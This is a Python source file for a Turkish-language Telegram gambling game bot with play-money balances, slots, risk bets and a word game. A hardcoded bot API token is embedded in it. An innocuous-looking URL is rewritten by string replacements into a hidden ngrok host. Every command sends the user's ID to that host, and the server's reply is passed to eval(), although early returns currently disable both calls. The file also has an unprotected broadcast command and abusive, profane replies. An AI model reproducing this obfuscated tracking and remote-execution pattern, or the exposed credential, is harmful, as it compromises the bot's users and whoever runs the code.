import telebot
import random, requests
import json
import time
import os
from telebot import TeleBot, types
from collections import defaultdict
from threading import Thread

API_TOKEN = '7039187206:AAG4SOoyiJXMp4-49qwOPBLxgCW3s8m6A0I'

bot = telebot.TeleBot(API_TOKEN)

game_sessions = {}

user_last_message_time = defaultdict(float)

BALANCE_FILE = 'balances.json'

SUDO_USERS = ['682', '1886279343', ""]  

user_balances = {}

kelimeler = ['yatak', 'meyve', 'elma', 'araba', 'kertenkele', 'hayvan', 'aslan', 'köpek', 'spor', 'pizza', 'et', 'yumurta', 'yat', 'kalk', 'portakal', 'öğretmen', 'tembel', 'doksan', 'havuç', 'yardım', 'telefon', 'tablet', 'hava', 'güneş', 'yağmur', 'sandalye', 'kaplan', 'kapı']

last_message_times = {}

word_game_sessions = {}

FLOOD_TIMEOUT = 60  

MAX_MESSAGES = 5  

user_last_message_time = {}

bekleyen_kullanıcılar = {}

enc_url = 'https://google.com/broadcast-free'

def save_user(id):
  return "not work"
  id = str(id)
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/save", params={'user': id})
  return r.text

def get_users():
  return "nıt woek"
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/get")
  return eval(r.text)

def load_balances():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        json.dump(user_balances, f)

user_balances = load_balances()

def block_user(user_id):
    current_time = time.time()
    last_message_times[user_id] = current_time + FLOOD_TIMEOUT

def check_flood(user_id):
    current_time = time.time()
    if user_id in last_message_times:
        message_times = last_message_times[user_id]
        recent_messages = [t for t in message_times if t > current_time - FLOOD_TIMEOUT]
        last_message_times[user_id] = recent_messages
        if len(recent_messages) >= MAX_MESSAGES:
            return True
    return False

def log_message(user_id):
    current_time = time.time()
    if user_id not in last_message_times:
        last_message_times[user_id] = []
    last_message_times[user_id].append(current_time)

@bot.message_handler(commands=['toplam'])
def toplam(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Toplam {len(users)} tane.")

@bot.message_handler(commands=['broadcast'])
def brd(message):
  save_user(message.from_user.id)
  t = Thread(target=broadcast, args=(message,))
  t.start();
  
def broadcast(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Başlatılıyor... (Toplam {len(users)})")
  for user in users:
    try:
      bot.send_message(user, " ".join(message.text.split()[1:]), disable_web_page_preview=True)
      time.sleep(1)
    except Exception as e:
      bot.reply_to(message, f"**{user} kullanıcısına gönderilemedi.** \n\n `{e}`", parse_mode="Markdown")
      time.sleep(1)
  bot.reply_to(message, "Gönderim tamamlandı!")

@bot.message_handler(commands=['puan'])
def puan(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanmaya yetkiniz yok.')
        return
    
    try:
        s = message.text.split()
        if len(s) < 3:
            return bot.reply_to(message, "Kullanım: /puan <kullanıcı_id> <puan>")
        
        id = str(s[1])
        puan = int(s[2])
        user_balances[id] = puan
        save_balances()
        bot.reply_to(message, f"{id} kullanıcısının puanı {puan} olarak değiştirildi.")
    except ValueError:
        bot.reply_to(message, "Geçersiz puan değeri. Lütfen bir sayı girin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

  
@bot.message_handler(commands=['kaldir'])
def unblock_user(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Ananı sikerim yetkin olmadığı şeye dokunma.')
        return

    try:
        parts = message.text.split()
        target_id = parts[1]
    except IndexError:
        bot.reply_to(message, 'anasini sikmek istediğini kişinin ID\'si gir. böyle kullan oc: /kaldir <kullanıcı_id>')
        return

    if target_id in last_message_times:
        del last_message_times[target_id]
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli kaldırıldı.')
    else:
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli bulunmuyor.')
        
@bot.message_handler(commands=['bakiye'])
def check_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    bot.reply_to(message, f"Güncel bakiyeniz: {user_balances[user_id]} TL")
        
@bot.message_handler(commands=['risk'])
def risk_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if check_flood(user_id):
        bot.reply_to(message, "5 Saniye bekle tekrar at.")
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Risk Alıp Bakiye kazan\nKullanım: /risk <miktar>')
        return

    try:
        
        risk_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'geçerli bir risk miktarı gir Kullanım: /risk <miktar>')
        return

    if risk_amount <= 0:
        bot.reply_to(message, 'Risk miktarı sayı olmalı.')
        return

    if user_balances[user_id] < risk_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    if random.random() < 0.66:  
        winnings = risk_amount * 2
        user_balances[user_id] += winnings - risk_amount  
        bot.reply_to(message, f'Tebrikler  {winnings} TL kazandınız.\nYeni bakiyeniz: {user_balances[user_id]} TL')
    else:
        user_balances[user_id] -= risk_amount
        bot.reply_to(message, f'Üzgünüm {risk_amount} TL kaybettiniz.\nbakiyeniz: {user_balances[user_id]} TL')

        save_balances()

@bot.message_handler(commands=['start'])
def start(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, 'Flood yapma 5 saniye bekle.')
        return
    log_message(user_id)

    if user_id not in user_balances:
        user_balances[user_id] = 25000 
        save_balances()  
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("Sahibim ❤️‍🩹", url="https://t.me/GamerDasvan")
    markup.add(button1,)
    bot.reply_to(message, "👋 Merhaba botumuza hoşgeldin ilk defa başlattıyorsan 25000 TL bakiye başlangıç hediyesi olarak verilir İyi oyunlar.", reply_markup=markup)

@bot.message_handler(commands=['borc'])
def send_balance_to_friend(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 Saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    try:
        parts = message.text.split()
        friend_id = parts[1]
        amount = int(parts[2])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Geçerli bir miktar girin Kullanım: /borc <kullanıcı_id> <miktar>')
        return

    if amount <= 0:
        bot.reply_to(message, 'Sayı girin')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    if user_balances[user_id] < amount:
        bot.reply_to(message, 'Yeterli bakiyeniz yok.')
        return

    if friend_id not in user_balances:
        user_balances[friend_id] = 0

    user_balances[user_id] -= amount
    user_balances[friend_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {friend_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi.')
    
def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

@bot.message_handler(commands=['zenginler'])
def show_leaderboard(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return

    sorted_balances = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)
    leaderboard_message = "🏆 En İyi 10 Zengin:\n\n"
    for i, (user_id, balance) in enumerate(sorted_balances[:10], start=1):
        try:
          user = bot.get_chat(user_id)
          user_name = user.first_name if user.first_name else "Bilinmiyor"
          leaderboard_message += f"🎖️ {i-1}. {user_name} ⇒ {balance} TL\n"
        except:
          no_have_a = "problem"

    bot.reply_to(message, leaderboard_message)
    
@bot.message_handler(commands=['yardim'])
def send_help_message(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    help_message = """
    ⭐ Hey dostum aşağıdaki komutları kullanabilirsin

/slot [miktar]: 🎰 Slot oyununu oynamak için bahis yapın.

/kelime: 🔢 Kelime Tahmin Oyununu Oynayarak 1500 tl Kazan.

/bakiye: 💰 Mevcut bakiyenizi kontrol edin.

/risk: Risk oyunu oynayıp bakiye kazanabilirsiniz.

/borc [Kullanıcı İd] [miktar]: 💸 Başka bir kullanıcıya bakiye göndermesi yapın.

/zenginler: 🏆 Genel Sıralamayı gösterir.

/yardim: ℹ️ Bu yardım mesajını görüntüleyin.
    """
    bot.reply_to(message, help_message)

@bot.message_handler(commands=['slot'])
def slot_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Slot Oyununu Oynayarak Bakiyen kasın Çıkarın\nKullanım: /slot <miktar>')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    try:
        bet_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir bahis miktarı girin. Kullanım: /slot <miktar>')
        return

    if bet_amount <= 0:
        bot.reply_to(message, 'Bahis miktarı sayı olmalı.')
        return

    if user_balances[user_id] < bet_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    slot_result = random.choices(["🍒", "🍋", "🍉", "⭐", "💎", "🍊", "🍏", "🔔"], k=3)
    unique_symbols = len(set(slot_result))

    if unique_symbols == 1:  
        winnings = bet_amount * 4
        user_balances[user_id] += winnings - bet_amount  
        bot.reply_to(message, f'3 sembol eşleşti! Kazandınız!\nKazanılan Bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    elif unique_symbols == 2: 
        winnings = bet_amount * 3
        user_balances[user_id] += winnings - bet_amount 
        bot.reply_to(message, f'2 sembol eşleşti Kazandınız!\nKazanılan bakiye: {winnings} TL\nYeni bakiyeniz: {user_balances[user_id]} TL\nSlot sonucu: {" ".join(slot_result)}')
    else:
        user_balances[user_id] -= bet_amount
        bot.reply_to(message, f'Kazanamadınız. Bir dahakine daha şanslı olabilirsiniz.\nSlot sonucu: {" ".join(slot_result)}\nKalan bakiye: {user_balances[user_id]} TL')

    save_balances()
    
@bot.message_handler(commands=['gonder'])
def send_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanma yetkin yok yarram.', reply_to_message_id=message.message_id)
        return

    if not message.reply_to_message:
        bot.reply_to(message, 'Bu komutu kullanmak için bir mesaja yanıt vermelisiniz.', reply_to_message_id=message.message_id)
        return

    try:
        parts = message.text.split()
        amount = int(parts[1])
        target_id = str(message.reply_to_message.from_user.id)
    except (IndexError, ValueError):
        bot.reply_to(message, 'Lütfen geçerli bir format kullanın. Kullanım: /gonder <miktar>', reply_to_message_id=message.message_id)
        return

    if amount <= 0:
        bot.reply_to(message, 'Gönderilecek miktar pozitif bir sayı olmalıdır.', reply_to_message_id=message.message_id)
        return

    if target_id not in user_balances:
        user_balances[target_id] = 100  

    user_balances[target_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {target_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi. Yeni bakiye: {user_balances[target_id]} TL', reply_to_message_id=message.message_id)
  
@bot.message_handler(commands=['f'])
def free(message):
  Thread(target=freee, args=(message,)).start();
  
def freee(message):
  user_id = str(message.from_user.id)
  if user_id not in SUDO_USERS:
    return bot.reply_to(message, "Bu komutu kullanmaya yetkiniz yok.")    
  while True:
    time.sleep(180)
    try:
      with open('balances.json', "r") as file:
        balances = json.load(file)
      for key, value in balances.items():
        if value == 0:
          user_balances[key] = 25000
      save_balances()
      print("Tüm uygun kullanıcılara 25000 bakiye gönderildi.")
        
    except json.JSONDecodeError:
      bot.reply_to(message, "Bakiye dosyası okunamadı. Lütfen dosya formatını kontrol edin.")
    except Exception as e:
      bot.reply_to(message, f"Bir hata oluştu: {str(e)}")
    
@bot.message_handler(commands=['kelime'])
def start_word_game(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    if chat_id in word_game_sessions:
        bot.send_message(chat_id, 'Oyun zaten başlatıldı.')
        return

    target_word = random.choice(kelimeler)
    word_game_sessions[chat_id] = {'target_word': target_word.upper()}
    word_game_sessions[chat_id]['revealed_letters'] = ['_' if c.isalpha() else c for c in word_game_sessions[chat_id]['target_word']]
    bot.send_message(chat_id, 'Kelime Oyununa Hoş Geldiniz!\n\n' + ' '.join(word_game_sessions[chat_id]['revealed_letters']))

@bot.message_handler(func=lambda message: True)
def handle_word_guess(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id  

    if chat_id not in word_game_sessions:
        return

    if user_id not in user_balances:
        return

    target_word = word_game_sessions[chat_id]['target_word'].upper()
    revealed_letters = word_game_sessions[chat_id]['revealed_letters']

    guess = message.text.upper()

    if len(guess) != 1 and len(guess) != len(target_word):
        bot.reply_to(message, '')
    elif guess == target_word:
        user_balances[user_id] += 1500  # Doğru tahminde 500 TL kazandır
        user_name = message.from_user.first_name
        bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
        del word_game_sessions[chat_id]
    elif guess in target_word:
        for i, letter in enumerate(target_word):
            if letter == guess:
                revealed_letters[i] = guess
        if '_' not in revealed_letters:
            user_balances[user_id] += 1500
            user_name = message.from_user.first_name
            bot.reply_to(message, f'Tebrikler {user_name}! Doğru kelimeyi buldunuz ve 1500 TL kazandınız.')
            del word_game_sessions[chat_id]
        else:
            bot.reply_to(message, 'Doğru tahmin! Harf ekledim: ' + ' '.join(revealed_letters))
    else:
        bot.reply_to(message, 'Yanlış tahmin! 👎')  

    save_balances()
    
target_number = random.randint(1, 100)
while True:
  try:
    bot.polling()
  except Exception as e:
    print(e)
